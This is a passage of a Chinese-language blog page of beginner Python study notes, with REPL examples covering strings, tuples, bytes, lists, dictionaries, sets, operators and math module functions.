prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;te\nst&quot;</span>)</span><br>te<br>st<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">r&quot;te\nst&quot;</span>)</span><br>te\nst<br></code></pre></td></tr></table></figure><p>注意</p><p>1、没有单独的字符类型，一个字符就是长度为1的字符串</p><p>2、反斜杠可以用来转义，使用r可以让反斜杠不发生转义</p><p>3、字符串可以用+运算符连接在一起，用*运算符重复</p><p>4、字符串有两种索引方式，从左往右以0开始，从右往左以-1开始</p><p>5、字符串不能改变</p><p>a[1] &#x3D; 1 会报错</p><h5 id="Tuple元组"><a href="#Tuple元组" class="headerlink" title="Tuple元组"></a>Tuple元组</h5><p>圆括号()标识，逗号,分隔元素，元素不可二次赋值，相当于不可变列表</p><p>元素类型可以不相同</p><p>元组名(开始下标:结束下标)</p><p>开始下标从0开始</p><p>空元组 ()</p><p>单元素元组，元素后需要逗号， (1,)</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tupletest = (<span class="hljs-number">1</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">2.1</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(tupletest[<span class="hljs-number">1</span>])</span><br>test<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(tupletest[<span class="hljs-number">0</span>])</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(tupletest[<span class="hljs-number">2</span>])</span><br>2.1<br></code></pre></td></tr></table></figure><p>给元组元素二次赋值会报错</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; tupletest<span class="hljs-selector-attr">[1]</span> = <span class="hljs-number">2</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;python-input-8&gt;&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    tupletest<span class="hljs-selector-attr">[1]</span> = <span class="hljs-number">2</span><br>    ~~~~~~~~~^^^<br>TypeError: <span class="hljs-string">&#x27;tuple&#x27;</span> <span class="hljs-selector-tag">object</span> does not support item assignment<br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><h5 id="bytes类型"><a href="#bytes类型" class="headerlink" title="bytes类型"></a>bytes类型</h5><p>1、不可变的二进制序列（byte sequence）</p><p>2、元素是整数值（0 到 255 之间的整数），例如：字符a存储的是97，而不是 Unicode 字符</p><p>3、常使用 b 前缀创建</p><p>4、常用于处理二进制数据，比如图像文件、音频文件、视频文件等等</p><p>网络编程中常使用 bytes 类型来传输二进制数据</p><p>5、bytes()函数将其他对象转换为bytes类型</p><p>​y &#x3D; bytes(x,encoding&#x3D;”utf-8”)</p><p>​x参数为需要转换的对象</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">test = <span class="hljs-string">&quot;hello&quot;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(test, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>))</span><br>b&#x27;hello&#x27;<br></code></pre></td></tr></table></figure><p>6、bytes类型支持切片、拼接、查找等操作，因为是不可变类型，操作需要创建新的变量</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&gt;&gt;&gt; aa = b<span class="hljs-string">&#x27;testaa&#x27;</span><br>&gt;&gt;&gt; print(type(aa))<br>&lt;<span class="hljs-keyword">class</span> &#x27;<span class="hljs-symbol">bytes</span>&#x27;&gt;<br>&gt;&gt;&gt; <span class="hljs-symbol">cc</span> = <span class="hljs-symbol">aa</span>[<span class="hljs-symbol">1:<span class="hljs-symbol">3</span></span>]<br>&gt;&gt;&gt; <span class="hljs-symbol">print</span>(<span class="hljs-symbol">cc</span>)<br><span class="hljs-symbol">b</span>&#x27;<span class="hljs-symbol">es</span>&#x27;<br>&gt;&gt;&gt; <span class="hljs-symbol">dd</span> = <span class="hljs-symbol">cc</span> + <span class="hljs-symbol">aa</span><br>&gt;&gt;&gt; <span class="hljs-symbol">print</span>(<span class="hljs-symbol">dd</span>)<br><span class="hljs-symbol">b</span>&#x27;<span class="hljs-symbol">estestaa</span>&#x27;<br></code></pre></td></tr></table></figure><p>7、由于bytes变量中存储的是整数，所以对比的时候需要将字符转换为整数，使用ord()函数</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">if</span> aa[<span class="hljs-number">1</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;e&#x27;</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-keyword">else</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NO&quot;</span>)</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    </span><br>OK<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">if</span> aa[<span class="hljs-number">1</span>] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;i&#x27;</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-keyword">else</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NO&quot;</span>)</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    </span><br>NO<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="可变数据"><a href="#可变数据" class="headerlink" title="可变数据"></a>可变数据</h4><h5 id="List列表"><a href="#List列表" class="headerlink" title="List列表"></a>List列表</h5><p>列表值支持数字、字符串、列表</p><p>方括号[]标识，逗号分隔的元素列表</p><p>可以通过下标索引分隔列表，返回新的列表</p><p>列表名[开始下标:结束下标]</p><p>索引键从0开始，结尾从-1开始</p><p>注意：</p><p>加号 + 列表连接符</p><p>星号 * 列表重复符</p><p>支持第三个参数，按步长获取数据，2是跨1个字符读取</p><h5 id="Dictionary字典"><a href="#Dictionary字典" class="headerlink" title="Dictionary字典"></a>Dictionary字典</h5><p>大括号{}标识</p><p>key 和 value 组成 </p><p>同一字典，key必须唯一</p><p>创建空字典使用{}</p><p>可变数据类型，元素可以二次赋值</p><p>dicttest &#x3D; {‘key’:’value’}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>dicttest = &#123;<span class="hljs-string">&quot;key1&quot;</span>:<span class="hljs-string">&quot;value1&quot;</span>, <span class="hljs-string">&quot;key2&quot;</span>:<span class="hljs-string">&quot;value2&quot;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(dicttest)<br>&#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>dicttest[‘key’]&#x3D;”value”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>dicttest[<span class="hljs-string">&#x27;key1&#x27;</span>]=<span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(dicttest)<br>&#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h6 id="Dictionary与List对比"><a href="#Dictionary与List对比" class="headerlink" title="Dictionary与List对比"></a>Dictionary与List对比</h6><p>List 有序的对象集合</p><p>Dictionary 无序的对象集合</p><h5 id="Set集合"><a href="#Set集合" class="headerlink" title="Set集合"></a>Set集合</h5><p>无序、可变的数据类型，用于存储唯一的元素</p><p>元素不可重复</p><p>可进行交集、并集、差集等常见的集合操作</p><p>大括号{}标识，逗号,分隔元素</p><p>set()函数创建或{value1,value2…}创建</p><p>空集合必须使用set()创建，不可以用{}创建，{}是创建空字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>aaa = &#123;&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(&#123;&#125;))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>ccc = <span class="hljs-built_in">set</span>()<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(ccc))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h1 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h1><h2 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h2><h2 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h2><p>‘’’  ‘’’</p><p>“””   “””</p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><ul><li></li></ul><ul><li></li></ul><ul><li></li></ul><p>&#x2F;</p><p>% 取模，返回除法的余数</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">22</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">11</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x % y</span><br>0<br></code></pre></td></tr></table></figure><p>** 幂  x**y 返回 x 的y次方</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">22</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">z = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x**z</span><br>484<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F; 取整除 - 往小的方向取整数</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">z = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">zz = <span class="hljs-number">11</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">zz//z</span><br>5<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">cc = -<span class="hljs-number">11</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">cc // z</span><br>-6<br></code></pre></td></tr></table></figure><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>返回bool值True或False</p><p>&#x3D;&#x3D; 等于</p><p>!&#x3D; 不等于</p><p>&gt; 大于</p><p>&lt; 小于</p><p>&gt;&#x3D; 大于等于</p><p>&lt;&#x3D; 小于等于</p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>&#x3D; 赋值</p><p>+&#x3D; 加法赋值运算符</p><p>​a +&#x3D; b 等价 a &#x3D; a+b</p><p>-&#x3D; 减法赋值运算符</p><p>*&#x3D; 乘法赋值运算符</p><p>&#x2F;&#x3D; 除法赋值运算符</p><p>%&#x3D; 取模赋值运算符</p><p>**&#x3D; 幂赋值运算符</p><p>&#x2F;&#x2F;&#x3D; 取整除赋值运算符</p><p>:&#x3D; 海象运算符</p><p>​表达式中同时进行赋值和返回赋值的值</p><p>​    a :&#x3D; 10，表示将10赋值给a，并返回a</p><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><h3 id="and"><a href="#and" class="headerlink" title="and"></a>and</h3><p>布尔与</p><p>x and y，如果 x 为 false，则返回x，否则返回y</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">0</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x <span class="hljs-keyword">and</span> y</span><br>0<br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x <span class="hljs-keyword">and</span> y</span><br>1<br></code></pre></td></tr></table></figure><h3 id="or"><a href="#or" class="headerlink" title="or"></a>or</h3><p>布尔或</p><p>x or y，如果 x 为 True，返回 x；否则返回 y</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">0</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x <span class="hljs-keyword">or</span> y</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">11</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x <span class="hljs-keyword">or</span> y</span><br>11<br></code></pre></td></tr></table></figure><h3 id="not"><a href="#not" class="headerlink" title="not"></a>not</h3><p>布尔非</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">not</span> x</span><br>False<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">0</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">not</span> x</span><br>True<br></code></pre></td></tr></table></figure><h2 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h2><h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><p>在搜索序列中找到，返回True；没有找到，返回False</p><h3 id="not-in"><a href="#not-in" class="headerlink" title="not in"></a>not in</h3><p>在搜索序列中没有找到，返回True；找到，返回False</p><h2 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h2><p>用于比较两个对象的存储单元，也就是内存地址，而不是值</p><h3 id="is"><a href="#is" class="headerlink" title="is"></a>is</h3><p>x is y 等价 id(x) is id(y)</p><p>相同返回True；否则返回False</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">z = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(x <span class="hljs-keyword">is</span> y)</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(z <span class="hljs-keyword">is</span> y)</span><br>False<br></code></pre></td></tr></table></figure><p>id()函数用于获取对象内存地址</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(x)</span><br>4386204320<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(y)</span><br>4386204320<br></code></pre></td></tr></table></figure><h3 id="is-not"><a href="#is-not" class="headerlink" title="is not"></a>is not</h3><p>相同返回False，不同返回True</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">y = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">z = <span class="hljs-number">2</span></span><br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(x <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> y)</span><br>False<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(x <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> z)</span><br>True<br></code></pre></td></tr></table></figure><h1 id="数字Number类型"><a href="#数字Number类型" class="headerlink" title="数字Number类型"></a>数字Number类型</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>varname &#x3D; varvalue</p><p>存储数值，为不可变数据类型，如果修改值，将重新分配内存空间</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(x)</span><br>4386204320<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">id</span>(x)</span><br>4386204352<br></code></pre></td></tr></table></figure><h2 id="删除定义"><a href="#删除定义" class="headerlink" title="删除定义"></a>删除定义</h2><p>del varname</p><p>del varname1, varname2</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; <span class="hljs-selector-tag">del</span>  <span class="hljs-attribute">x</span><br>&gt;&gt;&gt; <span class="hljs-built_in">id</span>(<span class="hljs-attribute">x</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;python-input-214&gt;&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-built_in">id</span>(<span class="hljs-attribute">x</span>)<br>       ^<br>NameError: name <span class="hljs-string">&#x27;x&#x27;</span> is not defined<br></code></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用前必须定义</p><h2 id="数字函数"><a href="#数字函数" class="headerlink" title="数字函数"></a>数字函数</h2><h3 id="abs-x"><a href="#abs-x" class="headerlink" title="abs(x)"></a>abs(x)</h3><p>返回数字的绝对值</p><h3 id="ceil-x"><a href="#ceil-x" class="headerlink" title="ceil(x)"></a>ceil(x)</h3><p>返回数字的向上取整值</p><p>需要导入math模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> math</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">x = <span class="hljs-number">1.1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.ceil(x)</span><br>2<br></code></pre></td></tr></table></figure><h3 id="exp-x"><a href="#exp-x" class="headerlink" title="exp(x)"></a>exp(x)</h3><p>返回e的x次幂</p><p>需要导入math模块</p><p>静态对象调用</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">&gt;&gt;&gt; <span class="hljs-built_in">math</span>.<span class="hljs-built_in">exp</span>(<span class="hljs-number">1</span>)<br><span class="hljs-number">2.718281828459045</span><br>&gt;&gt;&gt; <span class="hljs-built_in">math</span>.<span class="hljs-built_in">exp</span>(<span class="hljs-number">0</span>)<br><span class="hljs-number">1.0</span><br></code></pre></td></tr></table></figure><h3 id="fabs-x"><a href="#fabs-x" class="headerlink" title="fabs(x)"></a>fabs(x)</h3><p>返回以浮点数值形式的绝对值</p><p>需要导入math模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = -<span class="hljs-number">1.2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.fabs(a)</span><br>1.2<br></code></pre></td></tr></table></figure><h3 id="floor-x"><a href="#floor-x" class="headerlink" title="floor(x)"></a>floor(x)</h3><p>返回向下取整的值</p><p>需要导入math模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = -<span class="hljs-number">1.2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.floor(a)</span><br>-2<br></code></pre></td></tr></table></figure><h3 id="long-x"><a href="#long-x" class="headerlink" title="long(x)"></a>long(x)</h3><p>返回x的自然对数，x&gt;0</p><p>需要导入math模块</p><p>静态对象调用</p><h3 id="max-x"><a href="#max-x" class="headerlink" title="max(x)"></a>max(x)</h3><p>返回给定参数的最大值，参数可以为序列，也就是list\tuple\ditc等</p><p>比对规则，按索引顺序，逐个对比索引对应值的大小，直到遇见最大值，结束比对，返回最大值所在序列</p><p>给定参数的类型数值类型可以混用，序列类型不可混用，数值类型和序列类型混用会报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&gt;&gt;</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">max</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File &quot;&lt;python-input-249&gt;&quot;, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">module</span><span class="hljs-operator">&gt;</span><br>    <span class="hljs-built_in">max</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>    <span class="hljs-operator">~</span><span class="hljs-operator">~</span><span class="hljs-operator">~</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><br>TypeError: <span class="hljs-string">&#x27;&gt;&#x27;</span> <span class="hljs-keyword">not</span> supported <span class="hljs-keyword">between</span> instances <span class="hljs-keyword">of</span> <span class="hljs-string">&#x27;int&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;list&#x27;</span><br><span class="hljs-operator">&gt;&gt;</span><span class="hljs-operator">&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&gt;&gt;</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">max</span>([<span class="hljs-number">3</span>,<span class="hljs-number">6</span>],(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File &quot;&lt;python-input-255&gt;&quot;, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">module</span><span class="hljs-operator">&gt;</span><br>    <span class="hljs-built_in">max</span>([<span class="hljs-number">3</span>,<span class="hljs-number">6</span>],(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>    <span class="hljs-operator">~</span><span 